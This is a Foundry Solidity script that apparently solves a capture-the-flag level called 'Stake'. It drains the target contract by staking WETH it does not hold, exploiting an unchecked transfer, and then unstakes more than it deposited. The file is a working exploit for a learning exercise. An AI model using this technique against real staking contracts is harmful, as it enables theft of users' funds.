// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

import {AttackContract} from "src/Level31.sol";

// ================================================================
// │                        LEVEL 31 - STAKE                      │
// ================================================================
interface IWETH {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IStake {
    function WETH() external view returns (address);
    function totalStaked() external view returns (uint256);
    function StakeETH() external payable;
    function StakeWETH(uint256 amount) external returns (bool);
    function Unstake(uint256 amount) external returns (bool);
    function Stakers(address) external view returns (bool);
    function UserStake(address) external view returns (uint256);
}

contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();
        IStake stake = IStake(targetContractAddress);
        uint256 amount = 0.001 ether + 1 wei;
        IWETH weth = IWETH(stake.WETH());

        vm.startBroadcast();

        // Deploy the AttackContract contract and stake some ETH
        AttackContract attackContract = new AttackContract(address(stake));
        attackContract.attack{value: amount + 1 wei}();

        // Become a staker
        stake.StakeETH{value: amount}();

        // Approve the stake contract to use WETH
        weth.approve(address(stake), amount);

        // Stake WETH (that we don't have!)
        stake.StakeWETH(amount);

        // Unstake ETH + WETH (leave 1 wei in Stake contract)
        stake.Unstake(amount * 2);

        // 1. The Stake contract's ETH balance has to be greater than 0
        console.log("Stake contract ETH balance:", address(stake).balance);
        require(address(stake).balance > 0, "Stake balance == 0");

        // 2. totalStaked must be greater than the Stake contract's ETH balance
        console.log("Total staked:", stake.totalStaked());
        require(stake.totalStaked() > address(stake).balance, "Balance > Total staked");

        // 3. You must be a staker.
        console.log("You are a staker:", stake.Stakers(address(msg.sender)), address(msg.sender));
        require(stake.Stakers(address(msg.sender)), "You are not a staker");

        // 4. Your staked balance must be 0.
        console.log("Your staked balance:", stake.UserStake(address(msg.sender)));
        require(stake.UserStake(address(msg.sender)) == 0, "Your staked balance != 0");

        vm.stopBroadcast();
    }
}
